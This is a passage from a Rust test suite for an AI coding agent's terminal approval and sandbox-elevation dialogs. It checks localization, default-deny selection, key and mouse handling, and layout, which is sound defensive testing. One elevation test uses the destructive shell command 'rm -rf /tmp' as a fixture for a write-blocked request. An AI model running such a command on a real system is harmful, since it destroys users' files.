        "missing zh effect badge:\n{joined}"
    );
    assert!(
        !joined.contains("无法撤销"),
        "routine write must not use the destructive zh badge:\n{joined}"
    );
    assert!(
        joined.contains("Pg↑/↓回看"),
        "missing zh footer controls hint:\n{joined}"
    );
    assert!(
        !joined.contains("影响："),
        "impact dossier is critical-only:\n{joined}"
    );
    assert!(
        joined.contains("仅允许本次"),
        "missing zh approve option:\n{joined}"
    );
}

#[test]
fn approval_review_and_save_hints_stay_on_one_row_at_80_columns() {
    for &locale in Locale::shipped() {
        let view = ApprovalView::new_for_locale(destructive_request(), locale);
        let lines = render_lines(&view, 80, 40);
        let review_rows = lines
            .iter()
            .filter(|line| line.contains("Pg↑/↓"))
            .collect::<Vec<_>>();

        assert_eq!(
            review_rows.len(),
            1,
            "expected one approval review-hint row for {locale:?}:\n{}",
            lines.join("\n")
        );
        let controls = review_rows[0];
        assert!(
            controls.contains("Esc") && controls.contains(" s "),
            "review, abort, and save-rule hints wrapped for {locale:?}:\n{}",
            lines.join("\n")
        );
    }
}

#[test]
fn render_critical_zh_hans_localizes_security_copy() {
    let view = ApprovalView::new_for_locale(critical_request(), Locale::ZhHans);
    let lines = render_lines(&view, 100, 40);
    let joined = compact_rendered_text(&lines);
    assert!(
        joined.contains("无法撤销"),
        "missing zh risk badge:\n{joined}"
    );
    assert!(
        joined.contains("影响："),
        "missing zh impact label:\n{joined}"
    );
    assert!(
        joined.contains("规则:"),
        "missing zh policy semantics:\n{joined}"
    );
    assert!(
        joined.contains("仅允许本次"),
        "missing zh approve option:\n{joined}"
    );
}

#[test]
fn render_takeover_card_fills_most_of_area() {
    // The card should be wider than the old 65-cell popup whenever
    // the terminal can hold it; this guards against a regression
    // back to the centered popup.
    let view = ApprovalView::new(benign_request());
    let lines = render_lines(&view, 120, 40);
    // Find the widest non-blank rendered row.
    let widest = lines
        .iter()
        .map(|l| l.trim_end_matches(' ').len())
        .max()
        .unwrap_or(0);
    assert!(
        widest >= 80,
        "takeover card too narrow: widest row = {widest} cells"
    );
}

// ========================================================================
// ElevationView Tests
// ========================================================================

#[test]
fn test_elevation_view_initial_state() {
    for (network, write) in [(true, false), (false, true), (true, true), (false, false)] {
        let request =
            ElevationRequest::for_shell("test-id", "cargo build", "blocked", network, write);
        let view = ElevationView::new(request, Locale::En);
        assert_eq!(
            view.request().options[view.selected],
            ElevationOption::Abort
        );
        assert_eq!(
            view.approval_request_id(),
            None,
            "elevation is not an initial approval"
        );
        assert_eq!(view.tool_decision_request_id(), Some("test-id"));
    }
}

#[test]
fn elevation_ordinary_typing_then_enter_aborts() {
    for (network, write) in [(true, false), (false, true), (true, true), (false, false)] {
        let request =
            ElevationRequest::for_shell("test-id", "cargo build", "blocked", network, write);
        let mut view = ElevationView::new(request, Locale::En);
        // Includes every former letter shortcut and navigation letter. The
        // user meant to submit this to the composer when the card appeared.
        for ch in "fix the parser; make a new file now 123 NJKWFA".chars() {
            assert!(matches!(
                view.handle_key(create_key_event(KeyCode::Char(ch))),
                ViewAction::None
            ));
            assert_eq!(
                view.request().options[view.selected],
                ElevationOption::Abort
            );
        }
        assert!(matches!(
            view.handle_key(create_key_event(KeyCode::Enter)),
            ViewAction::EmitAndClose(ViewEvent::ElevationDecision {
                option: ElevationOption::Abort,
                ..
            })
        ));
    }
}

#[test]
fn elevation_modified_and_nonpress_keys_do_not_select_or_grant() {
    let mut view = ElevationView::new(elevation_shell_request(), Locale::En);
    for modifiers in [
        KeyModifiers::ALT,
        KeyModifiers::CONTROL,
        KeyModifiers::SUPER,
        KeyModifiers::SHIFT,
    ] {
        for code in [
            KeyCode::Up,
            KeyCode::Down,
            KeyCode::Enter,
            KeyCode::Esc,
            KeyCode::Char('f'),
        ] {
            let selected = view.selected;
            assert!(matches!(
                view.handle_key(KeyEvent::new(code, modifiers)),
                ViewAction::None
            ));
            assert_eq!(view.selected, selected);
        }
    }
    // Repeat/release must not confirm a deliberately selected grant either.
    view.handle_key(create_key_event(KeyCode::Up));
    assert_eq!(
        view.request().options[view.selected],
        ElevationOption::FullAccess
    );
    for kind in [
        crossterm::event::KeyEventKind::Repeat,
        crossterm::event::KeyEventKind::Release,
    ] {
        for code in [KeyCode::Up, KeyCode::Down, KeyCode::Enter, KeyCode::Esc] {
            let mut key = create_key_event(code);
            key.kind = kind;
            let selected = view.selected;
            assert!(matches!(view.handle_key(key), ViewAction::None));
            assert_eq!(view.selected, selected);
        }
    }
}

#[test]
fn test_elevation_view_navigation() {
    let mut view = ElevationView::new(elevation_shell_request(), Locale::En);
    assert_eq!(
        view.request().options[view.selected],
        ElevationOption::Abort
    );
    view.handle_key(create_key_event(KeyCode::Down));
    assert_eq!(
        view.request().options[view.selected],
        ElevationOption::WithNetwork
    );
    view.handle_key(create_key_event(KeyCode::Up));
    assert_eq!(
        view.request().options[view.selected],
        ElevationOption::Abort
    );
    view.handle_key(create_key_event(KeyCode::Up));
    assert_eq!(
        view.request().options[view.selected],
        ElevationOption::FullAccess
    );
}

#[test]
fn test_elevation_view_enter_uses_selected_option() {
    let request = ElevationRequest::for_shell("test-id", "cargo build", "blocked", true, true);
    for expected in request.options.clone() {
        let mut view = ElevationView::new(request.clone(), Locale::En);
        while view.request().options[view.selected] != expected {
            assert!(matches!(
                view.handle_key(create_key_event(KeyCode::Down)),
                ViewAction::None
            ));
        }
        let ViewAction::EmitAndClose(ViewEvent::ElevationDecision {
            option, tool_id, ..
        }) = view.handle_key(create_key_event(KeyCode::Enter))
        else {
            panic!("Enter should commit the selected offered option");
        };
        assert_eq!(option, expected);
        assert_eq!(tool_id, "test-id");
    }
    let mut view = ElevationView::new(request, Locale::En);
    assert!(matches!(
        view.handle_key(create_key_event(KeyCode::Esc)),
        ViewAction::EmitAndClose(ViewEvent::ElevationDecision {
            option: ElevationOption::Abort,
            ..
        })
    ));
}

#[test]
fn elevation_mouse_commits_the_visible_offered_row() {
    let request = ElevationRequest::for_shell("test-id", "cargo build", "blocked", true, true);
    for (w, h) in [(40, 12), (60, 16), (70, 22), (80, 24), (100, 32), (140, 40)] {
        for expected in request.options.clone() {
            let mut view = ElevationView::new(request.clone(), Locale::En);
            let lines = render_elevation_lines(&view, w, h);
            let (row, column) = lines
                .iter()
                .enumerate()
                .find_map(|(row, line)| {
                    // The full-access description may wrap at 40 columns.
                    line.find(expected.label().split(" (").next().expect("label"))
                        .map(|byte| (row, line[..byte].chars().count()))
                })
                .expect("offered option is visible");
            let ViewAction::EmitAndClose(ViewEvent::ElevationDecision {
                option, tool_id, ..
            }) = view.handle_mouse(MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: column as u16,
                row: row as u16,
                modifiers: KeyModifiers::NONE,
            })
            else {
                panic!("{w}x{h}: clicking the visible label must decide its row");
            };
            assert_eq!(option, expected, "{w}x{h}");
            assert_eq!(tool_id, "test-id");
        }
    }
}

fn render_elevation_lines(view: &ElevationView, w: u16, h: u16) -> Vec<String> {
    use ratatui::buffer::Buffer;
    use ratatui::layout::Rect;
    let mut buf = Buffer::empty(Rect::new(0, 0, w, h));
    view.render(Rect::new(0, 0, w, h), &mut buf);
    (0..h)
        .map(|row| {
            (0..w)
                .map(|col| buf[(col, row)].symbol().to_string())
                .collect::<String>()
        })
        .collect()
}

fn compact_elevation_text(lines: &[String]) -> String {
    lines.join("\n").replace(' ', "")
}

fn elevation_shell_request() -> ElevationRequest {
    ElevationRequest::for_shell("test-id", "cargo build", "network blocked", true, false)
}

#[test]
fn test_elevation_render_en_has_expected_strings() {
    let view = ElevationView::new(elevation_shell_request(), Locale::En);
    let lines = render_elevation_lines(&view, 70, 22);
    let joined = compact_elevation_text(&lines);
    assert!(
        joined.contains("SandboxElevationRequired"),
        "missing en title:\n{joined}"
    );
    assert!(
        !joined.contains("Tool:"),
        "the command row already names the shell:\n{joined}"
    );
    assert!(joined.contains("Cmd:"), "missing en cmd label:\n{joined}");
    assert!(
        joined.contains("Reason:"),
        "missing en reason label:\n{joined}"
    );
}

#[test]
fn elevation_always_paints_every_option_including_the_safe_exit() {
    // The card used to be a fixed 22 rows centred on the frame, with no scroll
    // rail and no truncation hint, so the option list ran off the bottom and
    // `Abort` — the only choice that grants nothing — was unreachable by sight
    // at every terminal size. Options are reserved now; the denial detail is
    // what shortens.
    let mut original = elevation_shell_request();
    original
        .options
        .insert(1, ElevationOption::WithWriteAccess(vec![]));
    let mut long = original.clone();
    long.command = Some("cargo build --package codewhale-tui ".repeat(40));
    long.denial_reason = "Network blocked; retry requires an explicit choice. ".repeat(80);
    for request in [original, long] {
        let view = ElevationView::new(request, Locale::En);
        for (w, h) in [(40, 12), (60, 16), (70, 22), (80, 24), (100, 32), (140, 40)] {
            let joined = compact_elevation_text(&render_elevation_lines(&view, w, h));
            for option in [
                "Abort",
                "Fullaccess",
                "Allowoutboundnetwork",
                "Allowextrawriteaccess",
            ] {
                assert!(
                    joined.contains(option),
                    "{w}x{h}: option '{option}' is not on screen:\n{joined}"
                );
            }
            assert!(
                joined.contains("SandboxElevationRequired"),
                "{w}x{h}: the card lost its title:\n{joined}"
            );
            for key in ["↑/↓", "Enter", "Esc"] {
                assert!(
                    joined.contains(key),
                    "{w}x{h}: missing keyboard access {key}:\n{joined}"
                );
            }
            assert!(
                joined.contains(&format!("{}Abort", crate::tui::glyphs::SELECTION)),
                "{w}x{h}: Abort needs a visible marker, not only a color change:\n{joined}"
            );
            for old_hint in ["[n]", "[w]", "[f]", "[a]"] {
                assert!(!joined.contains(old_hint), "obsolete shortcut {old_hint}");
            }
        }
    }
}

#[test]
fn test_elevation_render_zh_hans_localizes_copy() {
    let view = ElevationView::new(elevation_shell_request(), Locale::ZhHans);
    let lines = render_elevation_lines(&view, 70, 22);
    let joined = compact_elevation_text(&lines);
    assert!(joined.contains("沙箱提权"), "missing zh title:\n{joined}");
    assert!(joined.contains("命令："), "missing zh cmd label:\n{joined}");
    assert!(
        joined.contains("原因："),
        "missing zh reason label:\n{joined}"
    );
    assert!(
        joined.contains("批准后的影响"),
        "missing zh impact header:\n{joined}"
    );
    let en_artifacts = [
        "SandboxElevationRequired",
        "Tool:",
        "Cmd:",
        "Reason:",
        "Impactifapproved",
        "Choosehowtoproceed",
        "Allowoutboundnetwork",
        "Allowextrawriteaccess",
        "Fullaccess",
        "Abort",
    ];
    for artifact in &en_artifacts {
        assert!(
            !joined.contains(artifact),
            "English leak '{artifact}' in zh rendering:\n{joined}"
        );
    }
}

#[test]
fn test_elevation_render_ja_has_translated_copy() {
    let view = ElevationView::new(elevation_shell_request(), Locale::Ja);
    let lines = render_elevation_lines(&view, 70, 22);
    let joined = compact_elevation_text(&lines);
    assert!(
        joined.contains("サンドボックス昇格"),
        "missing ja title:\n{joined}"
    );
    assert!(
        joined.contains("コマンド："),
        "missing ja cmd label:\n{joined}"
    );
    assert!(
        joined.contains("理由："),
        "missing ja reason label:\n{joined}"
    );
    for eng in &["SandboxElevationRequired", "Tool:", "Cmd:", "Reason:"] as &[&str] {
        assert!(
            !joined.contains(eng),
            "English leak '{eng}' in ja:\n{joined}"
        );
    }
}

#[test]
fn test_elevation_render_zh_hant_has_translated_copy() {
    let view = ElevationView::new(elevation_shell_request(), Locale::ZhHant);
    let lines = render_elevation_lines(&view, 70, 22);
    let joined = compact_elevation_text(&lines);
    assert!(
        joined.contains("沙箱提權"),
        "missing zh-Hant title:\n{joined}"
    );
    assert!(
        joined.contains("指令："),
        "missing zh-Hant cmd label:\n{joined}"
    );
    assert!(
        joined.contains("原因："),
        "missing zh-Hant reason label:\n{joined}"
    );
}

// ========================================================================
// ElevationOption Tests
// ========================================================================

#[test]
fn test_elevation_option_labels() {
    assert_eq!(
        ElevationOption::WithNetwork.label(),
        "Allow outbound network"
    );
    assert_eq!(
        ElevationOption::FullAccess.label(),
        "Full access (filesystem + network)"
    );
    assert!(
        ElevationOption::WithWriteAccess(vec![])
            .label()
            .contains("write")
    );
    assert_eq!(ElevationOption::Abort.label(), "Abort");
}

#[test]
fn test_elevation_option_descriptions() {
    assert!(
        ElevationOption::WithNetwork
            .description()
            .contains("network")
    );
    assert!(
        ElevationOption::FullAccess
            .description()
            .contains("filesystem and network access")
    );
    assert!(ElevationOption::Abort.description().contains("Skip"));
}

#[test]
fn test_elevation_option_to_policy() {
    let cwd = PathBuf::from("/tmp/test");

    let policy = ElevationOption::WithNetwork.to_policy(&cwd);
    assert!(matches!(
        policy,
        SandboxPolicy::WorkspaceWrite {
            network_access: true,
            ..
        }
    ));

    let policy = ElevationOption::FullAccess.to_policy(&cwd);
    assert!(matches!(policy, SandboxPolicy::DangerFullAccess));

    let paths = vec![PathBuf::from("/tmp/test/src")];
    let policy = ElevationOption::WithWriteAccess(paths).to_policy(&cwd);
    assert!(matches!(policy, SandboxPolicy::WorkspaceWrite { .. }));
}

// ========================================================================
// ElevationRequest Tests
// ========================================================================

#[test]
fn test_elevation_request_for_shell_with_network_block() {
    let request = ElevationRequest::for_shell(
        "test-id",
        "curl example.com",
        "network blocked",
        true,
        false,
    );

    assert_eq!(request.tool_id, "test-id");
    assert_eq!(request.tool_name, "exec_shell");
    assert!(request.command.is_some());
    assert!(request.denial_reason.contains("network"));
    assert!(
        request
            .options
            .iter()
            .any(|o| matches!(o, ElevationOption::WithNetwork))
    );
}

#[test]
fn test_elevation_request_for_shell_with_write_block() {
    let request =
        ElevationRequest::for_shell("test-id", "rm -rf /tmp", "write blocked", false, true);

    assert_eq!(request.tool_id, "test-id");
    assert!(
        request
            .options
            .iter()
            .any(|o| matches!(o, ElevationOption::WithWriteAccess(_)))
    );
}

#[test]
fn test_elevation_request_generic() {
    let request = ElevationRequest::generic("test-id", "some_tool", "permission denied");

    assert_eq!(request.tool_id, "test-id");
    assert_eq!(request.tool_name, "some_tool");
    assert!(request.command.is_none());
    assert!(
        request
            .options
            .iter()
            .any(|o| matches!(o, ElevationOption::WithNetwork))
    );
    assert!(
        request
            .options
            .iter()
            .any(|o| matches!(o, ElevationOption::FullAccess))
    );
    assert!(
        request
            .options
            .iter()
            .any(|o| matches!(o, ElevationOption::Abort))
    );
}

// ========================================================================
// Workflow elevated plan approval card (#4126)
// ========================================================================

#[test]
fn workflow_tool_is_agent_category_and_shows_plan_card_fields() {
    assert_eq!(get_tool_category("workflow"), ToolCategory::Agent);
    let request = ApprovalRequest::new(
        "wf-1",
        "workflow",
        "Launch workflow",
        &json!({
            "action": "start",
            "plan": {
                "goal": "ship the fix",
                "risk": "writes",
                "token_budget": 80_000,
                "children": [
                    {
                        "id": "impl",
                        "label": "builder",
                        "prompt": "edit files",
                        "type": "implementer",
                        "mode": "read_write"
                    }
                ]
            }
        }),
        "tool:workflow",
    );
    assert_eq!(request.category, ToolCategory::Agent);
    let details = request.prominent_detail_items(Locale::En);
    let labels: Vec<_> = details.iter().map(|d| d.label.as_str()).collect();
    assert!(labels.contains(&"Goal"), "{labels:?}");
    assert!(labels.contains(&"Children"), "{labels:?}");
    assert!(labels.contains(&"Writes"), "{labels:?}");
    assert!(labels.contains(&"Shell"), "{labels:?}");
    assert!(labels.contains(&"Network"), "{labels:?}");
    assert!(labels.contains(&"Budget"), "{labels:?}");
    assert!(
        details
            .iter()
            .any(|d| d.label == "Goal" && d.value.contains("ship the fix")),
        "{details:?}"
    );
    assert!(
        details
            .iter()
            .any(|d| d.label == "Writes" && d.value == "yes"),
        "{details:?}"
    );
    assert!(
        request
            .impacts
            .iter()
            .any(|i| i.contains("Approve to launch")),
        "{:?}",
        request.impacts
    );

    let view = ApprovalView::new(request);
    assert!(view.is_workflow_plan_approval());
    assert_eq!(view.current_option(), ApprovalOption::Deny);
    assert_eq!(view.current_decision(), ReviewDecision::Denied);
}

#[test]
fn workflow_plan_card_edit_plan_and_cancel_keys() {
    let request = ApprovalRequest::new(
        "wf-2",
        "workflow",
        "Launch workflow",
        &json!({
            "action": "start",
            "plan": {
                "goal": "risky",
                "risk": "elevated",
                "children": [{ "prompt": "go", "type": "implementer" }]
            }
        }),
        "tool:workflow",
    );
    let mut view = ApprovalView::new(request);
    // [2 / e] → Edit plan → Denied
    let action = view.handle_key(create_key_event(KeyCode::Char('e')));
    match action {
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision { decision, .. }) => {
            assert_eq!(decision, ReviewDecision::Denied);
        }
        other => panic!("expected edit-plan denial, got {other:?}"),
    }

    let request = ApprovalRequest::new(
        "wf-3",
        "workflow",
        "Launch workflow",
        &json!({
            "action": "start",
            "plan": {
                "goal": "risky",
                "risk": "elevated",
                "children": [{ "prompt": "go", "type": "implementer" }]
            }
        }),
        "tool:workflow",
    );
    let mut view = ApprovalView::new(request);
    let action = view.handle_key(create_key_event(KeyCode::Char('3')));
    match action {
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision { decision, .. }) => {
            assert_eq!(decision, ReviewDecision::Abort);
        }
        other => panic!("expected cancel abort, got {other:?}"),
    }
}

#[test]
fn canonical_bash_keeps_original_name_but_uses_shell_approval_semantics() {
    let request = ApprovalRequest::new_with_intent(
        "bash-1",
        "Bash",
        "Run command",
        &json!({"action": "run", "command": "cargo test", "cwd": "/workspace"}),
        "tool:Bash",
        None,
        Path::new("/workspace"),
    );

    assert_eq!(request.tool_name, "Bash");
    assert_eq!(request.category, ToolCategory::Shell);
    assert_eq!(request.risk, RiskLevel::Destructive);
    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::exec_shell("cargo test")]
    );
    let details = request.prominent_detail_items(Locale::En);
    assert!(
        details
            .iter()
            .any(|detail| detail.label == "Command" && detail.value == "cargo test")
    );
}

#[test]
fn canonical_file_mutations_get_legacy_previews_and_scoped_ask_rules() {
    let cases = [
        (
            "write",
            json!({
                "action": "write",
                "path": "/workspace/src/lib.rs",
                "content": "pub fn whale() {}\n"
            }),
            "write_file",
            "+ pub fn whale() {}",
        ),
        (
            "edit",
            json!({
                "action": "edit",
                "path": "/workspace/src/lib.rs",
                "search": "old",
                "replace": "new"
            }),
            "edit_file",
            "- old",
        ),
        (
            "patch",
            json!({
                "action": "patch",
                "patch": "diff --git a/src/lib.rs b/src/lib.rs\n--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,1 +1,1 @@\n-old\n+new\n"
            }),
            "apply_patch",
            "-old",
        ),
    ];

    for (action, params, rule_tool, preview_fragment) in cases {
        let request = ApprovalRequest::new_with_intent(
            action,
            "File",
            "Mutate file",
            &params,
            "tool:File",
            None,
            Path::new("/workspace"),
        );
        assert_eq!(request.tool_name, "File", "{action}");
        assert_eq!(request.category, ToolCategory::FileWrite, "{action}");
        assert_eq!(request.risk, RiskLevel::Destructive, "{action}");
        assert!(
            request
                .persistent_ask_rules
                .iter()
                .any(|rule| rule.tool == rule_tool),
            "{action}: {:?}",
            request.persistent_ask_rules
        );
        let preview = request
            .prominent_detail_items(Locale::En)
            .into_iter()
            .find(|detail| detail.label == "Preview")
            .expect("canonical file mutation must show a preview");
        assert!(
            preview.value.contains(preview_fragment),
            "{action}: {preview:?}"
        );
    }
}

#[test]
fn delegated_work_cards_show_requested_authority_fields() {
    let long_prompt = "summarise the repository layout and report back ".repeat(4);
    for (tool, params) in [
        (
            "tasks",
            json!({
                "action": "create",
                "prompt": long_prompt,
                "trust_mode": true,
                "allow_shell": true,
                "auto_approve": true,
                "mode": "operate",
                "workspace": "/elsewhere"
            }),
        ),
        (
            "automation",
            json!({
                "action": "create",
                "name": "nightly",
                "prompt": long_prompt,
                "rrule": "FREQ=DAILY",
                "cwds": ["/elsewhere"],
                "trust_mode": true,
                "allow_shell": true,
                "auto_approve": true
            }),
        ),
        (
            "automation",
            json!({"action": "update", "automation_id": "a1", "auto_approve": true, "trust_mode": false}),
        ),
    ] {
        let request = ApprovalRequest::new_with_intent(
            "delegate-1",
            tool,
            "Create work",
            &params,
            "tool:delegate",
            None,
            Path::new("/workspace"),
        );
        let details = request.prominent_detail_items(Locale::En);
        let value = |label: &str| {
            details
                .iter()
                .find(|detail| detail.label == label)
                .map(|detail| detail.value.clone())
        };
        assert_eq!(
            value("Auto-approve").as_deref(),
            Some("on"),
            "{tool} {params}"
        );
        assert!(value("Trust mode").is_some(), "{tool} {params}");
        assert!(
            request
                .impacts
                .iter()
                .any(|line| line.starts_with("Auto-approve: on")),
            "{tool}: {:?}",
            request.impacts
        );
        if params.get("allow_shell").is_some() {
            assert_eq!(value("Trust mode").as_deref(), Some("on"));
            assert_eq!(value("Shell").as_deref(), Some("on"));
            assert!(value("Workspace").is_some_and(|dir| dir.contains("/elsewhere")));
        }
        let zh = request.prominent_detail_items(Locale::ZhHans);
        assert!(zh.iter().any(|detail| detail.label == "自动批准"));
    }

    // Other tools are unchanged.
    let plain = ApprovalRequest::new_with_intent(
        "read-1",
        "read_file",
        "Read",
        &json!({"path": "src/main.rs", "trust_mode": true}),
        "tool:read_file",
        None,
        Path::new("/workspace"),
    );
    assert!(
        !plain
            .prominent_detail_items(Locale::En)
            .iter()
            .any(|detail| detail.label == "Trust mode")
    );
}

fn native_band_expected_decisions(request: &ApprovalRequest) -> Vec<ReviewDecision> {
    let mut decisions = vec![ReviewDecision::Approved, ReviewDecision::ApprovedForSession];
    if request.tool_name == "workflow" {
        return vec![
            ReviewDecision::Approved,
            ReviewDecision::Denied,
            ReviewDecision::Abort,
        ];
    }
    if request.owner.is_none() && request.can_save_allow_rule() {
        decisions.push(ReviewDecision::Approved);
    }
    decisions.push(ReviewDecision::Denied);
    if request.owner.is_none() {
        decisions.push(ReviewDecision::Abort);
    }
    decisions
}

#[test]
fn kit_decision_band_matches_exact_legacy_paint_region_and_option_geometry() {
    use crate::tui::widgets::{Renderable, legacy_approval_band};
    use ratatui::{
        buffer::Buffer,
        layout::Rect,
        style::{Color, Style},
    };
    let mut child = shell_request();
    child.owner = Some(ApprovalOwner {
        agent_id: "child-1".into(),
        label: "Builder 你好".into(),
        role: Some("implementer".into()),
    });
    let workflow = ApprovalRequest::new(
        "workflow",
        "workflow",
        "Launch workflow",
        &json!({"action":"start","plan":{"goal":"ship the fix","children":[{"prompt":"go"}]}}),
        "tool:workflow",
    );
    let law = ApprovalRequest::new(
        "law",
        "edit_file",
        "Repo law holds this write: protected path",
        &json!({"path":"Cargo.toml","old":"a","new":"b"}),
        "tool:edit_file",
    );
    let cases = [
        benign_request(),
        shell_request(),
        critical_request(),
        destructive_request(),
        child,
        workflow,
        law,
    ];
    for &locale in Locale::shipped() {
        for request in &cases {
            for collapsed in [false, true] {
                for width in [40, 60, 80, 120] {
                    for height in [9, 12, 20, 40] {
                        let mut actual_view = ApprovalView::new_for_locale(request.clone(), locale);
                        actual_view.collapsed = collapsed;
                        let mut legacy_view = actual_view.clone();
                        let area = Rect::new(7, 5, width, height);
                        let canvas = Rect::new(2, 3, width + 12, height + 8);
                        let mut actual = Buffer::empty(canvas);
                        actual.set_style(
                            canvas,
                            Style::default()
                                .bg(Color::Rgb(11, 23, 37))
                                .add_modifier(ratatui::style::Modifier::UNDERLINED),
                        );
                        for cell in &mut actual.content {
                            cell.set_symbol("~");
                        }
                        let mut expected = actual.clone();
                        let guard = actual[(canvas.x, canvas.y)].clone();
                        let legacy =
                            legacy_approval_band::ApprovalWidget::new(request, &legacy_view);
                        assert_eq!(
                            actual_view.occupied_region(area),
                            legacy.inline_region(area)
                        );
                        actual_view.render(area, &mut actual);
                        legacy.render(area, &mut expected);
                        // The frozen painter's unbounded truncation hint can
                        // spill beyond the requested region. Preserve exact
                        // in-region paint while requiring the kit's bounds guard.
                        for y in canvas.y..canvas.bottom() {
                            for x in canvas.x..canvas.right() {
                                if x < area.x
                                    || x >= area.right()
                                    || y < area.y
                                    || y >= area.bottom()
                                {
                                    expected[(x, y)] = guard.clone();
                                }
                            }
                        }
                        assert_eq!(
                            actual, expected,
                            "locale={locale:?} tool={} collapsed={collapsed} area={area:?}",
                            request.tool_name
                        );
                        let mut expected_boxes = legacy_view.row_hitboxes.borrow().clone();
                        // Hidden/collapsed actions keep canonical empty slots.
                        expected_boxes.resize(
                            native_band_expected_decisions(request).len(),
                            Rect::default(),
                        );
                        assert_eq!(*actual_view.row_hitboxes.borrow(), expected_boxes);
                        for code in [KeyCode::Char('p'), KeyCode::Char('s')] {
                            assert_eq!(
                                matches!(
                                    actual_view.handle_key(create_key_event(code)),
                                    ViewAction::EmitAndClose(_)
                                ),
                                matches!(
                                    legacy_view.handle_key(create_key_event(code)),
                                    ViewAction::EmitAndClose(_)
                                )
                            );
                        }
                    }
                }
            }
        }
    }
}

#[test]
fn kit_decision_band_resize_to_zero_withdraws_persistent_keys_and_stale_hitboxes() {
    use ratatui::{buffer::Buffer, layout::Rect};
    let view = ApprovalView::new(shell_request());
    render_lines(&view, 120, 40);
    assert!(
        view.row_hitboxes
            .borrow()
            .iter()
            .any(|rect| !rect.is_empty())
    );
    let mut view = view;
    for area in [Rect::new(7, 5, 0, 40), Rect::new(7, 5, 120, 0)] {
        let mut buf = Buffer::empty(Rect::new(7, 5, 120, 40));
        view.render(area, &mut buf);
        assert!(
            view.row_hitboxes
                .borrow()
                .iter()
                .all(|rect| rect.is_empty())
        );
        for code in ['p', 's'] {
            assert!(matches!(
                view.handle_key(create_key_event(KeyCode::Char(code))),
                ViewAction::None
            ));
        }
    }
}

#[test]
fn kit_decision_band_last_wrapped_action_row_keeps_its_canonical_decision() {
    for &locale in Locale::shipped() {
        let request = destructive_request();
        let view = ApprovalView::new_for_locale(request.clone(), locale);
        render_lines(&view, 40, 12);
        let boxes = view.row_hitboxes.borrow().clone();
        for (index, rect) in boxes
            .iter()
            .enumerate()
            .filter(|(_, rect)| !rect.is_empty())
        {
            let mut view = view.clone();
            let action = view.handle_mouse(MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: rect.x,
                row: rect.bottom() - 1,
                modifiers: KeyModifiers::NONE,
            });
            let ViewAction::EmitAndClose(ViewEvent::ApprovalDecision { decision, .. }) = action
            else {
                panic!("wrapped row did not decide {locale:?} {index}");
            };
            assert_eq!(decision, native_band_expected_decisions(&request)[index]);
        }
    }
}

#[test]
fn kit_decision_band_keeps_parent_child_and_default_deny_authority() {
    let mut parent = ApprovalView::new(shell_request());
    render_lines(&parent, 120, 40);
    assert!(matches!(
        parent.handle_key(create_key_event(KeyCode::Enter)),
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Denied,
            ..
        })
    ));
    assert!(matches!(
        parent.handle_key(create_key_event(KeyCode::Esc)),
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Abort,
            ..
        })
    ));
    let mut child = shell_request();
    child.owner = Some(ApprovalOwner {
        agent_id: "child-1".into(),
        label: "Builder".into(),
        role: None,
    });
    let mut child = ApprovalView::new(child);
    render_lines(&child, 40, 12);
    assert!(matches!(
        child.handle_key(create_key_event(KeyCode::Esc)),
        ViewAction::Close
    ));
    assert!(
        matches!(child.handle_key(create_key_event(KeyCode::Char('g'))), ViewAction::Emit(ViewEvent::OpenAgentTranscript { agent_id }) if agent_id == "child-1")
    );
    for kind in [
        crossterm::event::KeyEventKind::Release,
        crossterm::event::KeyEventKind::Repeat,
    ] {
        let mut key = create_key_event(KeyCode::Char('y'));
        key.kind = kind;
        assert!(matches!(child.handle_key(key), ViewAction::None));
    }
    assert!(matches!(
        child.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::CONTROL)),
        ViewAction::None
    ));
    child.timeout = Some(std::time::Duration::from_secs(1));
    child.requested_at = std::time::Instant::now() - std::time::Duration::from_secs(2);
    assert!(matches!(
        child.tick(),
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Denied,
            timed_out: true,
            ..
        })
    ));
}

#[test]
fn kit_decision_band_clips_the_legacy_truncation_hint_spill() {
    use crate::tui::widgets::{Renderable, legacy_approval_band};
    use ratatui::{
        buffer::Buffer,
        layout::Rect,
        style::{Color, Style},
    };
    let request = critical_request();
    let actual_view = ApprovalView::new_for_locale(request.clone(), Locale::En);
    let legacy_view = actual_view.clone();
    let area = Rect::new(7, 5, 40, 20);
    let canvas = Rect::new(2, 3, 52, 28);
    let mut actual = Buffer::empty(canvas);
    actual.set_style(canvas, Style::default().bg(Color::Rgb(11, 23, 37)));
    for cell in &mut actual.content {
        cell.set_symbol("~");
    }
    let guard = actual[(canvas.x, canvas.y)].clone();
    let mut legacy = actual.clone();
    actual_view.render(area, &mut actual);
    legacy_approval_band::ApprovalWidget::new(&request, &legacy_view).render(area, &mut legacy);
    assert!(
        (area.y..area.bottom()).any(|y| legacy[(area.right(), y)] != guard),
        "the frozen counterpart demonstrates the old right-edge spill"
    );
    for y in canvas.y..canvas.bottom() {
        for x in canvas.x..canvas.right() {
            if x < area.x || x >= area.right() || y < area.y || y >= area.bottom() {
                assert_eq!(actual[(x, y)], guard, "guard at {x},{y}");
            }
        }
    }
}
